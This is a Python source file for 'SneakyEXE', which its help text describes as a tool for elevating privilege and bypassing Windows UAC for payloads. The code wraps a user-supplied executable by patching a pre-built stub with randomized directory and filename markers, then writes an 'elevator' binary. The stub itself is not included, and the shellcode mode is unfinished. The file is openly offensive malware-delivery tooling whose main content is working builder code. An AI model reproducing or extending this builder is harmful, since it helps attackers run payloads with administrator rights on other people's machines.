import subprocess, time, random,os,sys
from shutil import get_terminal_size, rmtree as REMOVE_TREE
from errno import E2BIG,ENOENT,EEXIST
from mimetypes import guess_type as DetectType
from Errno import *

##NOTE SECTION###
# Requires GCC to be pre-installed
# Requires Python 3.x >
# Python 2 isn't required ( why do i even need write this )
# Naming convention is strict, note that
#################

Release = "v0.9 beta"

ASCII = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g',
'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
Atterrisk_D = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # Directory randomization
Atterrisk_N = b"******************************************************************************\
**********************************************************************************************\
****************************************************************************************" # Naming convention

def PrintError(Message):
	sys.stderr.write("[{0}] : {1}\n".format(
			colored("ERROR", "red", attrs=['bold']),
			Message
		)
	)
	sys.stderr.flush()
	return 0 # Totally unnecessary but i like it :}

RandomDir = lambda:"".join([ASCII[random.randint(0,61)] for i in range(40)])

class LoadBinary:
	def __init__(self,func,data,destination):
		self.Function = func		 #Get the code
		self.Desti	= destination  #Get the destination
		self.Data	 = data		 #Get the data of the binary/shellcode
		if(self.Function=="b"):
			if not os.path.isfile(self.Data):
				PrintError("No such file as \"{}\"".format(
						self.Data
					)
				)
				os._exit(ENOENT)
			if os.path.isfile(self.Desti+DirectorySeparator+os.path.basename(self.Data)):
				PrintError("\"{}\" : Already exists".format(
						self.Desti+(DirectorySeparator if self.Desti[-1]!=DirectorySeparator else "")+os.path.basename(self.Data)
					)
				)
				self.an = input("Proceeding may overwrite it, Proceed ? [%s/%s]:" %(
					colored("y", 'red', attrs=['bold']),
					colored("n", 'red', attrs=['bold']))
				)
				while self.an.lower() not in ('y', 'n'):
					self.an = input("Invalid answer, try again [%s/%s]:" %(
						colored("y", 'red', attrs=['bold']),
						colored("n", 'red', attrs=['bold']))
					)
				if self.an == 'n':
					sys.stdout.write("- ABORTED -\n")
					os._exit(ABORT)
			self.binary()   # Execute the binary
		else:
			self.shellcode()# Execute the shellcode

	def binary(self):
		if os.access(self.Data, os.R_OK)==False: # Checking for Read-Permission
			PrintError("Require read-permission => \"{}\"".format(
					self.Data
				)
			)
		self.TypeExe = DetectType(self.Data)[0]
		if "application" in self.TypeExe:
			pass
		else: # CHecking for valid executable and PE Header
			sys.stderr.write("["+colored("WARNING", "red", attrs=['bold']) + "]" + " : ")
			if not ScanningFile(self.Data):
				sys.stderr.write("Couldn't detect PE header\n")
			else:
				sys.stderr.write("\"{}\" : Invalid mimetype \n".format(
						self.Data
					)
				)
				sys.stderr.write(" ├─>> Causes : MimeType : \"%s\"\n" % self.TypeExe)
			sys.stderr.write(" └─>> Status : %s \n" %(#colored(
					colored("Your payload might fail to execute",
						"red", attrs=["bold", "underline"]
					)
				)
			)
		sys.stdout.flush()
		sys.stderr.flush()
		self.Dirname = list(os.path.basename(self.Data))
		self.DName   = os.path.dirname(self.Data)
		self.ErrN = {}
		for self.index,self.i in enumerate(self.Dirname):
			if self.i in ('<', '>',"'",':','"','/','\\', '|','?','*'):
				self.ErrN[self.index]=self.i
		if self.ErrN:
			PrintError("Filename can't contain (<,>,',:,\",/,\\,|,?,*) due to Windows's naming convention")
			sys.stderr.write(" :FILE:=> \"{0}{1}".format(
					self.DName,
					("" if len(self.DName)==0 or self.DName[-1]==DirectorySeparator else DirectorySeparator)
				)
			)
			for self.i,self.var in self.ErrN.items():
				self.Dirname[self.i] = colored(self.var, "red", attrs=['bold'])
			sys.stderr.write("".join(self.Dirname)+"\"\n")
		self.Dirname = "".join(self.Dirname)
		self.MainName= self.Dirname + ("*"*(260-len(self.Dirname)))
		self.Option = b"1_Option"
		if sys.platform != 'linux':
			self.DataPByte = PayloadByte
		else:
			with open(REALPATH+DirectorySeparator+"/"+PathLib+"/payload.init", "rb") as self.dataP:
				self.DataPByte = self.dataP.read()
		with open(self.Data, "rb") as self.DataPass:
			with open(self.Desti+DirectorySeparator+self.Dirname, "wb") as self.Payexe:
				# Replace Install_Option
				# Replace DirectoryCode
				# Replace NamingConventionExe
				self.Payexe.write(self.DataPByte.replace(
						b"X_Option", self.Option, 1 # Option
					).replace(
						Atterrisk_D, RandomDir().encode(),1 # DirectoryCode
					).replace(
						Atterrisk_N, self.MainName.encode(),1 #NamingConventionExe
					)
				)
				self.d = self.DataPass.read(10000)
				while(self.d!=b''):
					self.Payexe.write(self.d)
					self.d = self.DataPass.read(10000)
		sys.stdout.write("[%s] : %s\n" %(
				colored("CREATED", "green", attrs=["bold"]),
				self.Desti+"/"+self.Dirname
			)
		)
		sys.stdout.flush()
	def shellcode(self):
		sys.stdout.write(" +-----------------[??????]--------------------+\n")
		sys.stdout.write(" ! No no no, use the executable version only   !\n")
		sys.stdout.write(" ! I am still working on this one so stay calm !\n")
		sys.stdout.write(" ! And keep being a hackernese... :}           !\n")
		sys.stdout.write(" +---------------------------------------------+\n")
		sys.stdout.write(" - Your friendly neighborhood hacker guy -\n")
		sys.stdout.flush()
		os._exit(SUCCESS)

def Uninstallation(none=None): # WTF
	if not Installed:
		return
	if not os.geteuid()==0:
		PrintError("Uninstallation requires to be run as root")
		os._exit(ACCESS)
	a = input("(%s) Are you sure you wanna uninstall SneakyEXE ? [Y/N]:" %colored("*", "green", attrs=["bold"]))
	while a.lower() not in ('y', 'n'):
		a = input(" => Invalid answer, try again [Y/N]:")
	if a.lower()=='n':
		os._exit(SUCCESS)

	sys.stdout.write("({}) : Uninstalling... ".format(colored("*", "green", attrs=["bold"])))
	UsrPath = REALPATH
	Profile_D=open(REALPATH+"/profile.d").read().partition("\n")[0]

	try:
		os.remove(Profile_D)
	except OSError as error:
		if error.errno==2:
			pass
		else:
			raise OSError(error)
	REMOVE_TREE(UsrPath)

	sys.stdout.write(" [%s]\n" % colored("DONE", "green", attrs=["bold"]))

	os._exit(SUCCESS)

def helpfunction(*trash): # Quite obvious... instructions for newbies
	sys.stdout.write('''
=[{Usage}]=
    ├─ {slash1}sneakyexe <option>=<payload/code> out=<path>
    │   ├─ option : bin | exec
    │   │    ├─ bin : Elevate and execute the payload
    │   │    │   └─ payload : Path to the executable
    │   │    └─ exec: Elevate and execute the shellcodes ( {UNFINISHED} )
    │   │        └─ code : Shellcodes
    │   └─ out:
    │       └─ path : The destination where the elevator'll be written to
    │
    ├─ {slash2}sneakyexe help  : Show usage and instructions of this tool
    │
    ├─ {slash3}sneakyexe stderr : Show all of the previous error-log
    │
=[{Info}]=
    ├─ Description : Elevating privilege, bypassing UAC for payloads
    ├─ Version     : {Version}
    ├─ Authors     : Zenix Blurryface ( Hackernese's admin )
    ├─ sub-credit  : UACme's Author : hfiref0x
    ├─ Contact     : https://github.com/Zenix-Blurryface
=[{NOTE}]=
    ├─ <code>   : Make sure it is a Windows-shellcode, with valid syscalls
    └─ <payload>: A valid Windows executable + accurate mimetype.\n
'''.format(
			Info = colored("Info", "green", attrs=["bold"]),
			Usage= colored("Usage", "green", attrs=["bold"]),
			UNFINISHED=colored("UNFINISHED", "red", attrs=["bold"]),
			NOTE = colored("NOTE", attrs=["bold"]),
			slash1=("" if Installed else "./"),
			slash2=("" if Installed else "./"),
			slash3=("" if Installed else "./"),
			Version = Release
		)
	)
	os._exit(SUCCESS)

def TakeCareOfST(Info,format, Datetime):
	line = format[format.index("line"):][:format[format.index("line"):].index(",")]
	with open(REALPATH+"/"+PathLib+"/log.err", "a") as proto:
		proto.write("\n"+colored(Datetime, "red")+(" : %s :" % line) +Info)

def STDERROR():
	data = open(REALPATH+"/"+PathLib+"/log.err").read()
	Tempo = data.split("\n")
	while "" in Tempo:
		Tempo.remove("")
	if not Tempo:
		sys.stdout.write("-::: No Logs yet :::-\n")
		sys.stdout.flush()
		os._exit(SUCCESS)
	sys.stdout.write("\n-==:[ Error Logs ] ==>> Version : %s\n" % Release)
	sys.stdout.write("\n".join(Tempo)+"\n"+"\n")
	sys.stdout.flush()
	os._exit(SUCCESS)

ScanningFile = lambda pathfile:(True if open(pathfile,"rb").read(2)==b"MZ" else False);
